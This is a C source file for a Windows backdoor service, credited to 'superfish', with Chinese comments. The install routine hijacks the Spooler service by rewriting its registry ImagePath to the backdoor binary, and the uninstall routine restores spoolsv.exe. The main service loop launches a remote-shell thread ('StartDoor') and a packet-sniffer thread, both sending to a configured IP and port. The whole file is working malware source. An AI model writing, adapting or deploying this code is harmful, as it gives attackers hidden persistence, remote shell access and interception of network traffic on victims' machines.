//////////////////////////////////////////////////////////////
//author : superfish
//date : 2015/12/12
//name : service.cpp
//thanks : yunshu
//////////////////////////////////////////////////////////////
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "wint.h"

BOOL                               isRunning; //服务是否在运行
SERVICE_STATUS                     serviceStatus; //服务状态
SERVICE_STATUS_HANDLE              hServiceStatus; //服务状态句柄

SHELL_ARGUMENT                     argus[FUNC_NUM]; //参数结构数组
HANDLE                             threadHandle[FUNC_NUM]; //线程句柄数组
DWORD                              threadID; //线程ID

//安装服务
BOOL ServiceInstall(char *exeFilePath)
{
	char tmpPath[MAX_PATH] = {0};
	HKEY key;
	
	#ifdef DEBUG
	    char tmp[256] = {0};
		sprintf(tmp, "Install: Path is : %s\n", exeFilePath);
		LogToFile(tmp);
	#endif
	
	/*安装一个新服务
	SC_HANDLE serviceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	
	if(serviceManagerHandle == 0){
		#ifdef DEBUG
	        char tmp[256] = {0};
		    sprintf(tmp, "Install: Open services manager database error: %d\n", exeFilePath);
		    LogToFile(tmp);
	    #endif
	
	    printf("Install: Open services manager database error: %d\n", GetLastError());
	
	    return FALSE;
	}
	
	#ifdef DEBUG
        LogToFile("Install: open services manager database successful\n");
    #endif
	
	SC_HANDLE serviceHandle = CreateService(serviceManagerHandle, 
	                                        SERVICE_NAME,
											SERVICE_DISPLAY_NAME,
											SERVICE_ALL_ACCESS, //访问权限
											SERVICE_WIN32_OWN_PROCESS, //win32类型服务
											SERVICE_AUTO_START, //自启动类型
											SERVICE_ERROR_NORMAL, //错误处理，此处忽略
											exeFilePath, //服务程序路径
											NULL, //不属于任何用户组
											NULL, //使用已存在的标签
											NULL, //独立的服务
											NULL, //本地系统账号
											NULL //密码为空
											);
	
	if(serviceHandle == 0){
		#ifdef DEBUG
	        char tmp[256] = {0};
		    sprintf(tmp, "Create service error: %d\n", GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("Create service error: %d\n", GetLastError());
		CloseServiceHandle(serviceManagerHandle);
		
		return FALSE;
	}
	
	#ifdef DEBUG
        LogToFile("Install: create services successful\n");
    #endif
	
	strcpy(tmpPath, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(tmpPath, SERVICE_NAME);
	
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, tmpPath, &key) != ERROR_SUCCESS){
		#ifdef DEBUG
	        char tmp[256] = {0};
		    sprintf(tmp, "Install: Open key %s error: %d\n", tmpPath, GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("Open key %s error: %d\n", tmpPath, GetLastError());
		
		return FALSE;
	}
	
	#ifdef DEBUG
        LogToFile("Install: open regedit successful\n");
    #endif
	
	RegSetValueEx(key, "Description", 0, REG_SZ, (BYTE *)SERVICE_DESCRIPTION, strlen(SERVICE_DESCRIPTION));
	
	#ifdef DEBUG
	    LogToFile("Install: write regedit successful\n");
	#endif
	
	RegCloseKey(key);
	CloseServiceHandle(serviceHandle);
	CloseServiceHandle(serviceManagerHandle);
	
	return TRUE;
	*/
	
	//替换系统服务Spooler的执行路径，改为后门
	strcpy(tmpPath, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(tmpPath, REPLACE_SERVICE_NAME);
	
	if(RegOpenKey(HKEY_LOCAL_MACHINE, tmpPath, &key) != ERROR_SUCCESS){
		#ifdef DEBUG
	        char tmp[256] = {0};
		    sprintf(tmp, "Install: Open key %s error: %d\n", tmpPath, GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("Open key %s error: %d\n", tmpPath, GetLastError());
		
		return FALSE;
	}
	
	#ifdef DEBUG
        LogToFile("Install: open regedit successful\n");
    #endif
	
	if(RegSetValueEx(key, "ImagePath", 0, REG_EXPAND_SZ, (BYTE *)exeFilePath, strlen(exeFilePath)) != ERROR_SUCCESS){
		#ifdef DEBUG
            char tmp[256] = {0};
            sprintf(tmp, "Install: Set key %s value error: %d\n", exeFilePath, GetLastError());
            LogToFile(tmp);
        #endif
        
		printf("Install: Set key %s value error: %d\n", exeFilePath, GetLastError());
		
        return FALSE;
	}
	
	#ifdef DEBUG
	    LogToFile("Install: write regedit successful\n");
	#endif
	
	RegCloseKey(key);
	
	return TRUE;
}

//删除服务
BOOL ServiceUnstall(char *serviceName)
{
	/*删除新服务
	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	
	if(scmHandle == NULL){
		#ifdef DEBUG
	        char tmp[256] = {0};
		    sprintf(tmp, "ServiceUnstall: open services manager database error: %d\n", GetLastError());
		    LogToFile(tmp);
	    #endif
	
	    printf("ServiceUnstall: open services manager database error: %d\n", GetLastError());
	
	    return FALSE;
	}
	
	#ifdef DEBUG
        LogToFile("ServiceUnstall: open services manager database successful\n");
    #endif
	
	SC_HANDLE scHandle = OpenService(scmHandle, serviceName, SERVICE_ALL_ACCESS);
	
	if(scHandle == NULL){
        #ifdef DEBUG
            char tmp[256] = {0};
            sprintf(tmp, "ServiceUntall: open services database error while delete service: %d\n", GetLastError());
            LogToFile(tmp);
        #endif             
		
		CloseServiceHandle(scmHandle);
                  
        return FALSE;
    }
	
	#ifdef DEBUG
        LogToFile("ServiceUnstall: open services database successful\n");
    #endif
	
	QueryServiceStatus(scHandle, &serviceStatus);
	if(status.dwCurrentState != SERVICE_STOPPED){
		ControlService(scHandle, SERVICE_CONTROL_STOP, &serviceStatus);
		isRunning = FALSE;
	}
	
	DeleteService(scHandle);
	CloseServiceHandle(scHandle);
	CloseServiceHandle(scmHandle);
	
	return TRUE;
	*/
	
	//替换回原Spooler服务
	char tmpPath[MAX_PATH] = {0};
	HKEY key;
	char *oldFilePath = "%systemroot%\\system32\\spoolsv.exe";
	strcpy(tmpPath, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(tmpPath, REPLACE_SERVICE_NAME);
	
	if(RegOpenKey(HKEY_LOCAL_MACHINE, tmpPath, &key) != ERROR_SUCCESS){
		#ifdef DEBUG
	        char tmp[256] = {0};
		    sprintf(tmp, "Unstall: Open key %s error: %d\n", REPLACE_SERVICE_NAME, GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("Open key %s error: %d\n", REPLACE_SERVICE_NAME, GetLastError());
		
		return FALSE;
	}
	
	#ifdef DEBUG
        LogToFile("Unstall: open regedit successful\n");
    #endif
	
	if(RegSetValueEx(key, "ImagePath", 0, REG_EXPAND_SZ, (BYTE *)oldFilePath, strlen(oldFilePath)) != ERROR_SUCCESS){
		#ifdef DEBUG
            char tmp[256] = {0};
            sprintf(tmp, "Unstall: Set key %s value error: %d\n", REPLACE_SERVICE_NAME, GetLastError());
            LogToFile(tmp);
        #endif
        
		printf("Unstall: Set key %s value error: %d\n", REPLACE_SERVICE_NAME, GetLastError());
		
        return FALSE;
	}
	
	#ifdef DEBUG
	    LogToFile("Unstall: write regedit successful\n");
	#endif
	
	RegCloseKey(key);
	
	return TRUE;
}


//服务函数主体
void ServiceMain(int args, char **argv)
{
	//设置服务初始化时的基本状态
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;//here
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;
      
    #ifdef DEBUG
        LogToFile("ServiceMain: Try to register service\n");
    #endif
	
	//注册服务控制函数
	hServiceStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceControl);
	
	if(hServiceStatus == (SERVICE_STATUS_HANDLE)0){ //判断注册情况	
        #ifdef DEBUG
            char tmp[256] = {0};
            sprintf(tmp,"ServiceMain: Register serviceControl error: %d\n", GetLastError());
            LogToFile(tmp);
        #endif
        
        return;
    }
	
	#ifdef DEBUG
        LogToFile("ServiceMain: Register serviceControl successful\n");
    #endif
	
	//注册成功，修改服务状态
	serviceStatus.dwCurrentState = SERVICE_RUNNING; 
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
	
	#ifdef DEBUG
        LogToFile("ServiceMain: Try to start service\n");
    #endif
	
	if(!SetServiceStatus(hServiceStatus, &serviceStatus)){ //向系统报告服务状态
        #ifdef DEBUG
            char tmp[256] = {0};
            sprintf(tmp,"ServiceMain: Start service error: %d\n", GetLastError());
            LogToFile( tmp );
        #endif
            
        return;            
    }
	
	isRunning = TRUE;
	 
	#ifdef DEBUG
        LogToFile("ServiceMain: Service is running now\n");
    #endif
	
	while(TRUE){ //服务功能
        if(!isRunning) break;
            
        #ifdef DEBUG
            LogToFile("ServiceMain: Start works now\n");
        #endif
		
		//works
		threadID = 1;
		
		//创建后门线程
		strncpy(argus[0].ip, IP, strlen(IP));
		strncpy(argus[0].port, SHELLPORT, strlen(SHELLPORT));
		threadHandle[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartDoor, &argus[0], 0, &threadID);
		Sleep(500);
		if(threadHandle[0] == NULL){
			#ifdef DEBUG
                char tmp[256] = {0};
                sprintf(tmp,"ServiceMain: Create thread to make shell error: %d\n", GetLastError());
                LogToFile( tmp );
            #endif
			
			printf("ServiceMain: Create thread to make shell error: %d\n", GetLastError());
			return;
		}		
		#ifdef DEBUG
            LogToFile("ServiceMain: Create thread to make shell successful\n");
        #endif
		threadID++;
		
		//创建嗅探线程
		strncpy(argus[1].ip, IP, strlen(IP));
		strncpy(argus[1].port, PACKPORT, strlen(PACKPORT));
		threadHandle[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Sniffer, &argus[1], 0, &threadID);
		Sleep(500);
		if(threadHandle[1] == NULL){
			#ifdef DEBUG
                char tmp[256] = {0};
                sprintf(tmp,"ServiceMain: Create thread to make sniffer error: %d\n", GetLastError());
                LogToFile( tmp );
            #endif
			
			printf("ServiceMain: Create thread to make sniffer error: %d\n", GetLastError());
			return;
		}		
		#ifdef DEBUG
            LogToFile("ServiceMain: Create thread to make sniffer successful\n");
        #endif
		threadID++;
		
		//等待线程退出
		for(int i = 0;i < FUNC_NUM;i++){
			WaitForSingleObject(threadHandle[i], INFINITE);
			CloseHandle(threadHandle[i]);
		}
    }
	
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
      
    if(!SetServiceStatus( hServiceStatus, &serviceStatus)){
        #ifdef DEBUG
            char tmp[256] = {0};
            sprintf(tmp, "ServiceMain: Stop service error: %d\n", GetLastError());
            LogToFile(tmp);
        #endif
    }
	
	return;
}

//服务控制函数
void ServiceControl(DWORD request)
{
	#ifdef DEBUG
        LogToFile("ServiceControl: Into ServiceControl\n");
    #endif
	
	switch(request)
	{
	case SERVICE_CONTROL_PAUSE:
		serviceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
		
	case SERVICE_CONTROL_CONTINUE:
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
		
	case SERVICE_CONTROL_SHUTDOWN:
	case SERVICE_CONTROL_STOP:
		
		#ifdef DEBUG
			LogToFile("ServiceControl: Try to stop service\n");
		#endif
		
		serviceStatus.dwWin32ExitCode = 0;
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		serviceStatus.dwCheckPoint = 0;
		isRunning = FALSE;
		
		if(!SetServiceStatus( hServiceStatus, &serviceStatus)){ 
			#ifdef DEBUG
				char tmp[256] = {0};
				sprintf(tmp,"ServiceMain: Stop service error: %d\n", GetLastError());
				LogToFile(tmp);
			#endif
		} 
		
		return;
		
	case SERVICE_CONTROL_INTERROGATE: break;
		
	default:
		
		#ifdef DEBUG
			LogToFile("ServiceControl: Error arguments\n");
		#endif
		
		break;
	}
	
	if(!SetServiceStatus( hServiceStatus, &serviceStatus )){
        #ifdef DEBUG
            char tmp[256] = {0};
            sprintf(tmp,"ServiceMain: Stop service error: %d\n", GetLastError());
            LogToFile(tmp);
        #endif
    }
 
    return;
}

//日志记录函数
#ifdef DEBUG
void LogToFile(char *str)
{
    FILE *fp;
      
    fp = fopen(DEBUG_LOG, "a");
    fputs(str, fp);
    fclose(fp);
}
#endif
